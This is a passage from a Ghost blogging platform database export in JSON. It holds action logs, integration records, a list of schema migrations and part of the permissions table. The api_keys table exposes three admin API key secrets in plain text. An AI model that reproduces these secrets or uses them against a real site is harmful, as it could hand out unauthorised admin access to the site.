{"meta":{"exported_on":1598601239289,"version":"3.31.2"},"data":{"actions":[{"id":"5f48b4cac6057c0001f5d29a","resource_id":"5f48b023651f2a0001821602","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2020-08-28T07:39:54.000Z"},{"id":"5f48b4cac6057c0001f5d29b","resource_id":"5f48b025651f2a0001821604","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2020-08-28T07:39:54.000Z"},{"id":"5f48b4cac6057c0001f5d29c","resource_id":"5f48b026651f2a0001821606","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2020-08-28T07:39:54.000Z"},{"id":"5f48b4cac6057c0001f5d29d","resource_id":"5f48b027651f2a0001821608","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2020-08-28T07:39:54.000Z"},{"id":"5f48b4cac6057c0001f5d29e","resource_id":"5f48b027651f2a000182160a","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2020-08-28T07:39:54.000Z"},{"id":"5f48b4cac6057c0001f5d29f","resource_id":"5f48b029651f2a000182160c","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2020-08-28T07:39:54.000Z"},{"id":"5f48b4cac6057c0001f5d2a0","resource_id":"5f48b02a651f2a000182160e","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2020-08-28T07:39:54.000Z"},{"id":"5f48b4cac6057c0001f5d2a1","resource_id":"5951f5fca366002ebd5dbef7","resource_type":"user","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2020-08-28T07:39:54.000Z"},{"id":"5f48b4dbc6057c0001f5d2a5","resource_id":"5f48b4d9c6057c0001f5d2a2","resource_type":"post","actor_id":"1","actor_type":"user","event":"added","context":null,"created_at":"2020-08-28T07:40:11.000Z"},{"id":"5f48b4e0c6057c0001f5d2a7","resource_id":"5f48b4d9c6057c0001f5d2a2","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2020-08-28T07:40:16.000Z"},{"id":"5f48b530c6057c0001f5d2a9","resource_id":"5f48b4d9c6057c0001f5d2a2","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2020-08-28T07:41:36.000Z"},{"id":"5f48b7f7c6057c0001f5d46a","resource_id":"5f48b4d9c6057c0001f5d2a2","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2020-08-28T07:53:27.000Z"}],"api_keys":[{"id":"5f48b02a651f2a0001821611","type":"admin","secret":"e4809a0acc90107d74ca947586425c5f960c69f1f52a1d6b2093e138732d0147","role_id":"5f48b00b651f2a00018215b3","integration_id":"5f48b02a651f2a0001821610","last_seen_at":null,"last_seen_version":null,"created_at":"2020-08-28T07:20:11.000Z","created_by":"1","updated_at":"2020-08-28T07:20:11.000Z","updated_by":"1"},{"id":"5f48b02a651f2a0001821613","type":"admin","secret":"fa95c4ae34c567442c77d54e405670567a8ab55ae875dbed6a02fc79d5cebd62","role_id":"5f48b00b651f2a00018215b4","integration_id":"5f48b02a651f2a0001821612","last_seen_at":null,"last_seen_version":null,"created_at":"2020-08-28T07:20:11.000Z","created_by":"1","updated_at":"2020-08-28T07:20:11.000Z","updated_by":"1"},{"id":"5f48b02a651f2a0001821615","type":"admin","secret":"c9a5c43202ec4209848391b64bdedb42fbc4018d6e817683ec2e5c6bc446daa4","role_id":"5f48b00b651f2a00018215b5","integration_id":"5f48b02a651f2a0001821614","last_seen_at":null,"last_seen_version":null,"created_at":"2020-08-28T07:20:11.000Z","created_by":"1","updated_at":"2020-08-28T07:20:11.000Z","updated_by":"1"}],"app_fields":[],"app_settings":[],"apps":[],"brute":[{"key":"5yCNE5bdFFt82A49bQcDGbQBKBO+ib4UqTWSS5L8o6E=","firstRequest":1598599986301,"lastRequest":1598599986301,"lifetime":1598603586320,"count":1},{"key":"zLKDZtEx54HQmYKBwaLzTDKuYc08fwo2Q/vnyYoO4sY=","firstRequest":1598601098526,"lastRequest":1598601098526,"lifetime":1598604698534,"count":1}],"emails":[],"integrations":[{"id":"5f48b02a651f2a0001821610","type":"builtin","name":"Zapier","slug":"zapier","icon_image":null,"description":"Built-in Zapier integration","created_at":"2020-08-28T07:20:10.000Z","created_by":"1","updated_at":"2020-08-28T07:20:10.000Z","updated_by":"1"},{"id":"5f48b02a651f2a0001821612","type":"internal","name":"Ghost Backup","slug":"ghost-backup","icon_image":null,"description":"Internal DB Backup integration","created_at":"2020-08-28T07:20:10.000Z","created_by":"1","updated_at":"2020-08-28T07:20:10.000Z","updated_by":"1"},{"id":"5f48b02a651f2a0001821614","type":"internal","name":"Ghost Scheduler","slug":"ghost-scheduler","icon_image":null,"description":"Internal Scheduler integration","created_at":"2020-08-28T07:20:10.000Z","created_by":"1","updated_at":"2020-08-28T07:20:10.000Z","updated_by":"1"}],"invites":[],"labels":[],"members":[],"members_labels":[],"members_stripe_customers":[],"members_stripe_customers_subscriptions":[],"migrations":[{"id":1,"name":"1-create-tables.js","version":"init","currentVersion":"3.31"},{"id":2,"name":"2-create-fixtures.js","version":"init","currentVersion":"3.31"},{"id":3,"name":"1-post-excerpt.js","version":"1.3","currentVersion":"3.31"},{"id":4,"name":"1-codeinjection-post.js","version":"1.4","currentVersion":"3.31"},{"id":5,"name":"1-og-twitter-post.js","version":"1.5","currentVersion":"3.31"},{"id":6,"name":"1-add-backup-client.js","version":"1.7","currentVersion":"3.31"},{"id":7,"name":"1-add-permissions-redirect.js","version":"1.9","currentVersion":"3.31"},{"id":8,"name":"1-custom-template-post.js","version":"1.13","currentVersion":"3.31"},{"id":9,"name":"2-theme-permissions.js","version":"1.13","currentVersion":"3.31"},{"id":10,"name":"1-add-webhooks-table.js","version":"1.18","currentVersion":"3.31"},{"id":11,"name":"1-webhook-permissions.js","version":"1.19","currentVersion":"3.31"},{"id":12,"name":"1-remove-settings-keys.js","version":"1.20","currentVersion":"3.31"},{"id":13,"name":"1-add-contributor-role.js","version":"1.21","currentVersion":"3.31"},{"id":14,"name":"1-multiple-authors-DDL.js","version":"1.22","currentVersion":"3.31"},{"id":15,"name":"1-multiple-authors-DML.js","version":"1.22","currentVersion":"3.31"},{"id":16,"name":"1-update-koenig-beta-html.js","version":"1.25","currentVersion":"3.31"},{"id":17,"name":"2-demo-post.js","version":"1.25","currentVersion":"3.31"},{"id":18,"name":"1-rename-amp-column.js","version":"2.0","currentVersion":"3.31"},{"id":19,"name":"2-update-posts.js","version":"2.0","currentVersion":"3.31"},{"id":20,"name":"3-remove-koenig-labs.js","version":"2.0","currentVersion":"3.31"},{"id":21,"name":"4-permalink-setting.js","version":"2.0","currentVersion":"3.31"},{"id":22,"name":"5-remove-demo-post.js","version":"2.0","currentVersion":"3.31"},{"id":23,"name":"6-replace-fixture-posts.js","version":"2.0","currentVersion":"3.31"},{"id":24,"name":"1-add-sessions-table.js","version":"2.2","currentVersion":"3.31"},{"id":25,"name":"2-add-integrations-and-api-key-tables.js","version":"2.2","currentVersion":"3.31"},{"id":26,"name":"3-insert-admin-integration-role.js","version":"2.2","currentVersion":"3.31"},{"id":27,"name":"4-insert-integration-and-api-key-permissions.js","version":"2.2","currentVersion":"3.31"},{"id":28,"name":"5-add-mobiledoc-revisions-table.js","version":"2.2","currentVersion":"3.31"},{"id":29,"name":"1-add-webhook-columns.js","version":"2.3","currentVersion":"3.31"},{"id":30,"name":"2-add-webhook-edit-permission.js","version":"2.3","currentVersion":"3.31"},{"id":31,"name":"1-add-webhook-permission-roles.js","version":"2.6","currentVersion":"3.31"},{"id":32,"name":"1-add-members-table.js","version":"2.8","currentVersion":"3.31"},{"id":33,"name":"1-remove-empty-strings.js","version":"2.13","currentVersion":"3.31"},{"id":34,"name":"1-add-actions-table.js","version":"2.14","currentVersion":"3.31"},{"id":35,"name":"2-add-actions-permissions.js","version":"2.14","currentVersion":"3.31"},{"id":36,"name":"1-add-type-column-to-integrations.js","version":"2.15","currentVersion":"3.31"},{"id":37,"name":"2-insert-zapier-integration.js","version":"2.15","currentVersion":"3.31"},{"id":38,"name":"1-add-members-perrmissions.js","version":"2.16","currentVersion":"3.31"},{"id":39,"name":"1-normalize-settings.js","version":"2.17","currentVersion":"3.31"},{"id":40,"name":"2-posts-add-canonical-url.js","version":"2.17","currentVersion":"3.31"},{"id":41,"name":"1-restore-settings-from-backup.js","version":"2.18","currentVersion":"3.31"},{"id":42,"name":"1-update-editor-permissions.js","version":"2.21","currentVersion":"3.31"},{"id":43,"name":"1-add-member-permissions-to-roles.js","version":"2.22","currentVersion":"3.31"},{"id":44,"name":"1-insert-ghost-db-backup-role.js","version":"2.27","currentVersion":"3.31"},{"id":45,"name":"2-insert-db-backup-integration.js","version":"2.27","currentVersion":"3.31"},{"id":46,"name":"3-add-subdirectory-to-relative-canonical-urls.js","version":"2.27","currentVersion":"3.31"},{"id":47,"name":"1-add-db-backup-content-permission.js","version":"2.28","currentVersion":"3.31"},{"id":48,"name":"2-add-db-backup-content-permission-to-roles.js","version":"2.28","currentVersion":"3.31"},{"id":49,"name":"3-insert-ghost-scheduler-role.js","version":"2.28","currentVersion":"3.31"},{"id":50,"name":"4-insert-scheduler-integration.js","version":"2.28","currentVersion":"3.31"},{"id":51,"name":"5-add-scheduler-permission-to-roles.js","version":"2.28","currentVersion":"3.31"},{"id":52,"name":"6-add-type-column.js","version":"2.28","currentVersion":"3.31"},{"id":53,"name":"7-populate-type-column.js","version":"2.28","currentVersion":"3.31"},{"id":54,"name":"8-remove-page-column.js","version":"2.28","currentVersion":"3.31"},{"id":55,"name":"1-add-post-page-column.js","version":"2.29","currentVersion":"3.31"},{"id":56,"name":"2-populate-post-page-column.js","version":"2.29","currentVersion":"3.31"},{"id":57,"name":"3-remove-page-type-column.js","version":"2.29","currentVersion":"3.31"},{"id":58,"name":"1-remove-name-and-password-from-members-table.js","version":"2.31","currentVersion":"3.31"},{"id":59,"name":"01-add-members-stripe-customers-table.js","version":"2.32","currentVersion":"3.31"},{"id":60,"name":"02-add-name-to-members-table.js","version":"2.32","currentVersion":"3.31"},{"id":61,"name":"01-correct-members-stripe-customers-table.js","version":"2.33","currentVersion":"3.31"},{"id":62,"name":"01-add-stripe-customers-subscriptions-table.js","version":"2.34","currentVersion":"3.31"},{"id":63,"name":"02-add-email-to-members-stripe-customers-table.js","version":"2.34","currentVersion":"3.31"},{"id":64,"name":"03-add-name-to-members-stripe-customers-table.js","version":"2.34","currentVersion":"3.31"},{"id":65,"name":"01-add-note-to-members-table.js","version":"2.35","currentVersion":"3.31"},{"id":66,"name":"01-add-self-signup-and-from address-to-members-settings.js","version":"2.37","currentVersion":"3.31"},{"id":67,"name":"01-remove-user-ghost-auth-columns.js","version":"3.0","currentVersion":"3.31"},{"id":68,"name":"02-drop-token-auth-tables.js","version":"3.0","currentVersion":"3.31"},{"id":69,"name":"03-drop-client-auth-tables.js","version":"3.0","currentVersion":"3.31"},{"id":70,"name":"04-add-posts-meta-table.js","version":"3.0","currentVersion":"3.31"},{"id":71,"name":"05-populate-posts-meta-table.js","version":"3.0","currentVersion":"3.31"},{"id":72,"name":"06-remove-posts-meta-columns.js","version":"3.0","currentVersion":"3.31"},{"id":73,"name":"07-add-posts-type-column.js","version":"3.0","currentVersion":"3.31"},{"id":74,"name":"08-populate-posts-type-column.js","version":"3.0","currentVersion":"3.31"},{"id":75,"name":"09-remove-posts-page-column.js","version":"3.0","currentVersion":"3.31"},{"id":76,"name":"10-remove-empty-strings.js","version":"3.0","currentVersion":"3.31"},{"id":77,"name":"11-update-posts-html.js","version":"3.0","currentVersion":"3.31"},{"id":78,"name":"12-populate-members-table-from-subscribers.js","version":"3.0","currentVersion":"3.31"},{"id":79,"name":"13-drop-subscribers-table.js","version":"3.0","currentVersion":"3.31"},{"id":80,"name":"14-remove-subscribers-flag.js","version":"3.0","currentVersion":"3.31"},{"id":81,"name":"01-add-send-email-when-published-to-posts.js","version":"3.1","currentVersion":"3.31"},{"id":82,"name":"02-add-email-subject-to-posts-meta.js","version":"3.1","currentVersion":"3.31"},{"id":83,"name":"03-add-email-preview-permissions.js","version":"3.1","currentVersion":"3.31"},{"id":84,"name":"04-add-subscribed-flag-to-members.js","version":"3.1","currentVersion":"3.31"},{"id":85,"name":"05-add-emails-table.js","version":"3.1","currentVersion":"3.31"},{"id":86,"name":"06-add-email-permissions.js","version":"3.1","currentVersion":"3.31"},{"id":87,"name":"07-add-uuid-field-to-members.js","version":"3.1","currentVersion":"3.31"},{"id":88,"name":"08-add-uuid-values-to-members.js","version":"3.1","currentVersion":"3.31"},{"id":89,"name":"09-add-further-email-permissions.js","version":"3.1","currentVersion":"3.31"},{"id":90,"name":"10-add-email-error-data-column.js","version":"3.1","currentVersion":"3.31"},{"id":91,"name":"01-add-cancel-at-period-end-to-subscriptions.js","version":"3.2","currentVersion":"3.31"},{"id":92,"name":"1-add-labels-table.js","version":"3.6","currentVersion":"3.31"},{"id":93,"name":"2-add-members-labels-table.js","version":"3.6","currentVersion":"3.31"},{"id":94,"name":"3-add-labels-permissions.js","version":"3.6","currentVersion":"3.31"},{"id":95,"name":"01-fix-incorrect-member-labels-foreign-keys.js","version":"3.7","currentVersion":"3.31"},{"id":96,"name":"01-add-geolocation-to-members.js","version":"3.8","currentVersion":"3.31"},{"id":97,"name":"01-add-member-sigin-url-permissions.js","version":"3.9","currentVersion":"3.31"},{"id":98,"name":"01-remove-broken-complimentary-plan-from-members-settings.js","version":"3.11","currentVersion":"3.31"},{"id":99,"name":"01-add-identity-permission.js","version":"3.12","currentVersion":"3.31"},{"id":100,"name":"02-remove-legacy-is-paid-flag-from-settings.js","version":"3.12","currentVersion":"3.31"},{"id":101,"name":"01-add-email-preview-permissions-to-roles.js","version":"3.18","currentVersion":"3.31"},{"id":102,"name":"02-add-members_stripe_connect-auth-permissions.js","version":"3.18","currentVersion":"3.31"},{"id":103,"name":"01-update-member-from-email-address.js","version":"3.19","currentVersion":"3.31"},{"id":104,"name":"01-removed-legacy-values-from-settings-table.js","version":"3.22","currentVersion":"3.31"},{"id":105,"name":"02-settings-key-renames.js","version":"3.22","currentVersion":"3.31"},{"id":106,"name":"03-add-group-and-flags-to-settings.js","version":"3.22","currentVersion":"3.31"},{"id":107,"name":"04-populate-settings-groups-and-flags.js","version":"3.22","currentVersion":"3.31"},{"id":108,"name":"05-migrate-members-subscription-settings.js","version":"3.22","currentVersion":"3.31"},{"id":109,"name":"06-migrate-stripe-connect-settings.js","version":"3.22","currentVersion":"3.31"},{"id":110,"name":"07-update-type-for-settings.js","version":"3.22","currentVersion":"3.31"},{"id":111,"name":"01-migrate-bulk-email-settings.js","version":"3.23","currentVersion":"3.31"},{"id":112,"name":"02-remove-bulk-email-settings.js","version":"3.23","currentVersion":"3.31"},{"id":113,"name":"03-update-portal-button-setting.js","version":"3.23","currentVersion":"3.31"},{"id":114,"name":"04-add-meta-columns-to-tags-table.js","version":"3.23","currentVersion":"3.31"},{"id":115,"name":"01-populate-group-for-new-portal-settings.js","version":"3.24","currentVersion":"3.31"},{"id":116,"name":"01-add-members-stripe-webhook-settings.js","version":"3.25","currentVersion":"3.31"},{"id":117,"name":"01-add-amp-gtag-id-setting.js","version":"3.26","currentVersion":"3.31"},{"id":118,"name":"01-remove-duplicate-subscriptions.js","version":"3.29","currentVersion":"3.31"},{"id":119,"name":"02-remove-duplicate-customers.js","version":"3.29","currentVersion":"3.31"},{"id":120,"name":"03-remove-orphaned-customers.js","version":"3.29","currentVersion":"3.31"},{"id":121,"name":"04-remove-orphaned-subscriptions.js","version":"3.29","currentVersion":"3.31"},{"id":122,"name":"05-add-member-constraints.js","version":"3.29","currentVersion":"3.31"},{"id":123,"name":"01-add-member-signin-url-permission-roles.js","version":"3.30","currentVersion":"3.31"}],"migrations_lock":[{"lock_key":"km01","locked":0,"acquired_at":"2020-08-28T07:15:32.000Z","released_at":"2020-08-28T07:20:15.000Z"}],"permissions":[{"id":"5f48b00b651f2a00018215b6","name":"Export database","object_type":"db","action_type":"exportContent","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215b7","name":"Import database","object_type":"db","action_type":"importContent","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215b8","name":"Delete all content","object_type":"db","action_type":"deleteAllContent","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215b9","name":"Send mail","object_type":"mail","action_type":"send","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215ba","name":"Browse notifications","object_type":"notification","action_type":"browse","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215bb","name":"Add notifications","object_type":"notification","action_type":"add","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215bc","name":"Delete notifications","object_type":"notification","action_type":"destroy","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215bd","name":"Browse posts","object_type":"post","action_type":"browse","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215be","name":"Read posts","object_type":"post","action_type":"read","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215bf","name":"Edit posts","object_type":"post","action_type":"edit","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215c0","name":"Add posts","object_type":"post","action_type":"add","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215c1","name":"Delete posts","object_type":"post","action_type":"destroy","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215c2","name":"Browse settings","object_type":"setting","action_type":"browse","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215c3","name":"Read settings","object_type":"setting","action_type":"read","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215c4","name":"Edit settings","object_type":"setting","action_type":"edit","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215c5","name":"Generate slugs","object_type":"slug","action_type":"generate","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215c6","name":"Browse tags","object_type":"tag","action_type":"browse","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215c7","name":"Read tags","object_type":"tag","action_type":"read","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215c8","name":"Edit tags","object_type":"tag","action_type":"edit","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215c9","name":"Add tags","object_type":"tag","action_type":"add","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215ca","name":"Delete tags","object_type":"tag","action_type":"destroy","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215cb","name":"Browse themes","object_type":"theme","action_type":"browse","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215cc","name":"Edit themes","object_type":"theme","action_type":"edit","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215cd","name":"Activate themes","object_type":"theme","action_type":"activate","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215ce","name":"Upload themes","object_type":"theme","action_type":"add","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215cf","name":"Download themes","object_type":"theme","action_type":"read","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215d0","name":"Delete themes","object_type":"theme","action_type":"destroy","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215d1","name":"Browse users","object_type":"user","action_type":"browse","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215d2","name":"Read users","object_type":"user","action_type":"read","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215d3","name":"Edit users","object_type":"user","action_type":"edit","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215d4","name":"Add users","object_type":"user","action_type":"add","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215d5","name":"Delete users","object_type":"user","action_type":"destroy","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215d6","name":"Assign a role","object_type":"role","action_type":"assign","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215d7","name":"Browse roles","object_type":"role","action_type":"browse","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215d8","name":"Browse invites","object_type":"invite","action_type":"browse","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215d9","name":"Read invites","object_type":"invite","action_type":"read","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215da","name":"Edit invites","object_type":"invite","action_type":"edit","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00b651f2a00018215db","name":"Add invites","object_type":"invite","action_type":"add","object_id":null,"created_at":"2020-08-28T07:19:39.000Z","created_by":"1","updated_at":"2020-08-28T07:19:39.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215dc","name":"Delete invites","object_type":"invite","action_type":"destroy","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215dd","name":"Download redirects","object_type":"redirect","action_type":"download","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215de","name":"Upload redirects","object_type":"redirect","action_type":"upload","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215df","name":"Add webhooks","object_type":"webhook","action_type":"add","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215e0","name":"Edit webhooks","object_type":"webhook","action_type":"edit","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215e1","name":"Delete webhooks","object_type":"webhook","action_type":"destroy","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215e2","name":"Browse integrations","object_type":"integration","action_type":"browse","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215e3","name":"Read integrations","object_type":"integration","action_type":"read","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215e4","name":"Edit integrations","object_type":"integration","action_type":"edit","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215e5","name":"Add integrations","object_type":"integration","action_type":"add","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215e6","name":"Delete integrations","object_type":"integration","action_type":"destroy","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215e7","name":"Browse API keys","object_type":"api_key","action_type":"browse","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215e8","name":"Read API keys","object_type":"api_key","action_type":"read","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215e9","name":"Edit API keys","object_type":"api_key","action_type":"edit","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215ea","name":"Add API keys","object_type":"api_key","action_type":"add","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215eb","name":"Delete API keys","object_type":"api_key","action_type":"destroy","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215ec","name":"Browse Actions","object_type":"action","action_type":"browse","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215ed","name":"Browse Members","object_type":"member","action_type":"browse","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215ee","name":"Read Members","object_type":"member","action_type":"read","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215ef","name":"Edit Members","object_type":"member","action_type":"edit","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215f0","name":"Add Members","object_type":"member","action_type":"add","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215f1","name":"Delete Members","object_type":"member","action_type":"destroy","object_id":null,"created_at":"2020-08-28T07:19:40.000Z","created_by":"1","updated_at":"2020-08-28T07:19:40.000Z","updated_by":"1"},{"id":"5f48b00c651f2a00018215f2","name":"Publish 